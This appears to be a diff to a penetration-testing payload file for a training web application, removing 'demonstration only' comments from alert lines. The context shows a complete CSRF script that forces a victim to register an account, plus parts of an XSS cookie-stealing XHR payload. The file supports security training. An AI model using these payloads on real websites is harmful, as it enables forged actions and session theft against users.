@@ -869,7 +869,7 @@ Value:
 						try{ 
 							lXMLHTTP = new XMLHttpRequest(); 
 						}catch (e) { 
-							alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+							alert(e.message); 
 						};//end try
 					};//end try
 				};//end try
@@ -885,7 +885,7 @@ Value:
 				lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
 				lXMLHTTP.send(lData);		
 			}catch(e){ 
-				alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+				alert(e.message); 
 			};
 		};//end function
 		</script>
@@ -925,7 +925,7 @@ Value:
 				try { 
 					lXMLHTTP = new XMLHttpRequest(); 
 				}catch (e) { 
-					//alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+					//alert(e.message); 
 				} 
 			} 
 		}//end try
@@ -979,7 +979,7 @@ Force someone to register without their consent:
 
 Force someone to register without their consent:
 Here is the same example using XHR rather than the "onmouseover" event:
-<script> var lXMLHTTP; try{ var lData = "username=fred&password=pass&confirm_password=pass&my_signature=signature1&register-php-submit-button=Create+Account"; var lAction = "/index.php?page=register.php"; var lMethod = "POST"; try { lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); }catch (e) { try { lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); }catch (e) { try { lXMLHTTP = new XMLHttpRequest(); }catch (e) { alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } }//end try lXMLHTTP.onreadystatechange = function(){ if(lXMLHTTP.readyState == 4){ alert("CSRF Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } } ///////////////////////////// //UNCOMMENT FOR GET REQUESTS ///////////////////////////// //xmlhttp.open(lMethod, lAction, true); //lData=""; ///////////////////////////// ///////////////////////////// //UNCOMMENT FOR POST REQUESTS ///////////////////////////// lXMLHTTP.open(lMethod, lAction, true); lXMLHTTP.setRequestHeader("Method", "POST " + lAction + " HTTP/1.1"); lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); lXMLHTTP.send(lData); }catch(e){ alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. } </script> 
+<script> var lXMLHTTP; try{ var lData = "username=fred&password=pass&confirm_password=pass&my_signature=signature1&register-php-submit-button=Create+Account"; var lAction = "/index.php?page=register.php"; var lMethod = "POST"; try { lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP"); }catch (e) { try { lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP"); }catch (e) { try { lXMLHTTP = new XMLHttpRequest(); }catch (e) { alert(e.message); } } }//end try lXMLHTTP.onreadystatechange = function(){ if(lXMLHTTP.readyState == 4){ alert("CSRF Complete"); } } ///////////////////////////// //UNCOMMENT FOR GET REQUESTS ///////////////////////////// //xmlhttp.open(lMethod, lAction, true); //lData=""; ///////////////////////////// ///////////////////////////// //UNCOMMENT FOR POST REQUESTS ///////////////////////////// lXMLHTTP.open(lMethod, lAction, true); lXMLHTTP.setRequestHeader("Method", "POST " + lAction + " HTTP/1.1"); lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); lXMLHTTP.send(lData); }catch(e){ alert(e.message); } </script> 
 
 ------------------------------------------------------------------------------------
 Sample to perform cross-site script on the Add to Your Blog that will 
@@ -1191,14 +1191,14 @@ Generic XHR to steal cookies (prefix and suffix as necessary)
 				try { 
 					lXMLHTTP = new XMLHttpRequest(); 
 				}catch (e) { 
-					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+					alert(e.message); 
 				} 
 			} 
 		}//end try
 		 
 		lXMLHTTP.onreadystatechange = function(){ 
 			if(lXMLHTTP.readyState == 4){ 
-				alert("Capture Complete");//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+				alert("Capture Complete"); 
 			}// end if 
 		} 
 		
@@ -1221,6 +1221,6 @@ Generic XHR to steal cookies (prefix and suffix as necessary)
 		lXMLHTTP.send(lData);
 		
 	}catch(e){ 
-		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST. 
+		alert(e.message); 
 	} 
 </script>
